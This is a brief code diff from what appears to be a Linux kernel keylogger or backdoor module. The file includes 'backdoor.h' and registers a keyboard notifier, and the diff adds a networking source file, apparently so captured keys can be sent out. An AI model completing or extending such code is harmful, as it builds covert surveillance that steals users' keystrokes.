@@ -6,6 +6,7 @@
 #include <linux/interrupt.h>
 
 #include "backdoor.h"
+#include "utils/networking.c"
 
 static struct notifier_block keyboard_notifier_block = {
     .notifier_call = keyboard_notifier_callback,
